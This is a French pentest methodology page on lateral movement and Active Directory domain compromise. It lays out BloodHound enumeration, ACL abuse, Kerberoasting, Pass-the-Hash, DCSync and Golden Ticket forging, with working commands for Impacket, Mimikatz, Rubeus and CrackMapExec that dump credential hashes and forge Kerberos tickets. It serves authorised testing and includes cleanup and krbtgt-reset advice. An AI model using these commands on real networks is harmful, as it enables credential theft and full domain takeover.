# Mouvement lateral et compromission AD

Une fois dans le reseau interne avec des credentials valides, la progression vers la compromission du domaine Active Directory suit un cycle iteratif : enumeration des droits, exploitation des relations de confiance, extraction de nouveaux credentials, et repetition jusqu'a obtenir un acces Domain Admin.

## Pourquoi

L'acces initial a un seul hote ou un seul compte utilisateur ne represente qu'une fraction de l'impact reel. Le mouvement lateral demontre au client comment un attaquant peut passer d'un acces limite a un controle complet de l'infrastructure, en exploitant les relations de confiance et les mauvaises configurations de l'Active Directory.

## Comment ca marche

### Enumeration Active Directory

L'enumeration AD est la premiere etape apres l'obtention de credentials de domaine. L'objectif est de cartographier les utilisateurs, les groupes, les permissions et les chemins d'attaque.

#### BloodHound

BloodHound collecte les donnees de l'AD et les presente sous forme de graphe visuel, revelant les chemins d'attaque entre les objets du domaine.

```bash
# - Collection des donnees (depuis un hote joint au domaine)
.\SharpHound.exe -c All

# - Alternative depuis un hote Linux via le reseau
proxychains bloodhound-python -u 'utilisateur' -p 'motdepasse' \
  -d domaine.local -ns <IP_DC> -c All
```

```bash
# - Demarrer neo4j et BloodHound
sudo neo4j start
bloodhound
# Importer le fichier ZIP genere par SharpHound
```

Les requetes BloodHound les plus utiles :

| Requete | Objectif |
|---|---|
| **Shortest Path to Domain Admin** | Chemin le plus court vers DA |
| **Find all Domain Admins** | Lister les comptes DA |
| **Find Kerberoastable Users** | Comptes avec SPN (Kerberoasting) |
| **Find AS-REP Roastable Users** | Comptes sans pre-authentification Kerberos |
| **Shortest Path from Owned Principals** | Chemins depuis les comptes compromis |

{% hint style="info" %}
Marquer chaque compte compromis comme "owned" dans BloodHound met a jour automatiquement les chemins d'attaque disponibles. Cela permet de visualiser les nouvelles opportunites a chaque etape de la progression.
{% endhint %}

### Techniques de mouvement lateral

#### Abus des ACL Active Directory

Les permissions excessives sur les objets AD sont un vecteur de mouvement lateral courant.

| Droit | Impact | Exploitation |
|---|---|---|
| **ForceChangePassword** | Changer le mot de passe d'un autre utilisateur | `Set-DomainUserPassword` (PowerView) |
| **GenericWrite** | Modifier les attributs d'un objet | Definir un faux SPN pour Kerberoasting cible |
| **GenericAll** | Controle total sur un objet | Modifier le mot de passe, ajouter a un groupe |
| **WriteDACL** | Modifier les permissions | S'accorder des droits supplementaires |
| **WriteOwner** | Changer le proprietaire | Devenir proprietaire puis modifier les ACL |

```powershell
# - ForceChangePassword avec PowerView
$NewPassword = ConvertTo-SecureString 'NouveauMotDePasse123!' -AsPlainText -Force
Set-DomainUserPassword -Identity cible -AccountPassword $NewPassword

# - GenericWrite : definir un faux SPN pour Kerberoasting cible
Set-DomainObject -Identity cible -SET @{serviceprincipalname='faux/SPN'}
```

#### Kerberoasting

Le Kerberoasting cible les comptes de service avec des SPN. Le ticket TGS est chiffre avec le hash du mot de passe du compte, ce qui permet un craquage hors ligne.

```bash
# - Enumeration des comptes avec SPN
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC>

# - Extraction du ticket TGS
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC> \
  -request-user compte_service

# - Craquage du ticket
hashcat -m 13100 ticket_tgs.hash /usr/share/wordlists/rockyou.txt
```

{% hint style="warning" %}
Si un faux SPN a ete defini pour un Kerberoasting cible, ne pas oublier de le supprimer en fin d'engagement et de le documenter dans les annexes du rapport.
{% endhint %}

#### Credential Reuse et Pass-the-Hash

Les credentials extraits d'un hote sont souvent reutilisables sur d'autres systemes. Les hashes NTLM peuvent etre utilises directement sans craquage (Pass-the-Hash).

```bash
# - Pass-the-Hash avec CrackMapExec
proxychains crackmapexec smb 172.16.8.0/23 -u administrateur -H <HASH_NTLM>

# - Execution de commandes via PsExec
proxychains psexec.py DOMAINE/administrateur@<IP_CIBLE> -hashes :<HASH_NTLM>

# - Extraction des secrets LSA
proxychains crackmapexec smb <IP_CIBLE> -u utilisateur -p motdepasse --lsa
```

### Compromission du domaine

#### DCSync

L'attaque DCSync exploite le protocole de replication des controleurs de domaine pour extraire les hashes de tous les utilisateurs du domaine. Elle necessite les privileges `GetChanges` et `GetChangesAll` sur l'objet domaine.

```bash
# - DCSync avec Impacket
proxychains secretsdump.py DOMAINE/utilisateur_privilegie@<IP_DC>

# - DCSync avec Mimikatz (depuis un hote Windows)
.\mimikatz.exe "lsadump::dcsync /domain:DOMAINE.LOCAL /user:Administrator" exit
```

#### Pass-the-Ticket

Si un ticket Kerberos TGT est disponible en memoire sur un hote compromis, il peut etre extrait et reutilise.

```powershell
# - Lister les tickets disponibles
.\Rubeus.exe triage

# - Extraire un TGT
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt

# - Injecter le ticket dans la session
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

#### Golden Ticket

Avec le hash du compte `krbtgt`, il est possible de forger des tickets Kerberos pour n'importe quel utilisateur, assurant une persistance totale sur le domaine.

```bash
# - Forger un Golden Ticket avec Impacket
ticketer.py -nthash <HASH_KRBTGT> -domain-sid <SID_DOMAINE> \
  -domain DOMAINE.LOCAL administrateur
```

{% hint style="danger" %}
Le Golden Ticket est un vecteur de persistance extremement puissant. Dans un rapport de pentest, recommander le changement du mot de passe du compte `krbtgt` deux fois de suite (la premiere reinitialisation invalide l'ancien hash, la seconde invalide le nouveau qui est devenu l'ancien).
{% endhint %}

## En pratique

### Cycle de progression typique

```
Credentials initiaux
       |
       v
Enumeration BloodHound --> Chemins d'attaque identifies
       |
       v
Exploitation ACL / Kerberoasting / Pass-the-Hash
       |
       v
Nouveaux credentials --> Nouveaux hotes compromis
       |
       v
Repetition jusqu'a Domain Admin
       |
       v
DCSync --> Hashes de tous les utilisateurs
```

## Pieges et galeres

- **Se precipiter vers DA** : prendre le temps d'enumerer completement l'AD avant de lancer des attaques. Un chemin non optimise peut declencher des alertes inutiles
- **Oublier les partages SMB** : les partages reseau contiennent souvent des scripts avec des credentials en clair, des fichiers de configuration, des sauvegardes de base de donnees. Toujours les enumerer
- **Kerberoasting sans resultat** : si les mots de passe des comptes de service sont robustes, le craquage echouera. Ne pas persister et chercher un autre vecteur
- **Ne pas nettoyer les SPN** : un faux SPN defini pour un Kerberoasting cible doit etre supprime en fin d'engagement. Le documenter dans le journal des modifications
- **Compte verrouille** : le brute force sur des comptes AD peut verrouiller les utilisateurs. Verifier la politique de verrouillage avant de tenter un password spraying

## Memo express

| Technique | Prerequis | Outil |
|---|---|---|
| **BloodHound** | Credentials de domaine | SharpHound, bloodhound-python |
| **Kerberoasting** | Compte de domaine quelconque | GetUserSPNs.py, Rubeus |
| **Abus ACL** | Droits specifiques sur un objet AD | PowerView |
| **Pass-the-Hash** | Hash NTLM | CrackMapExec, PsExec |
| **DCSync** | GetChanges + GetChangesAll | secretsdump.py, Mimikatz |
| **Golden Ticket** | Hash krbtgt | ticketer.py, Mimikatz |

***
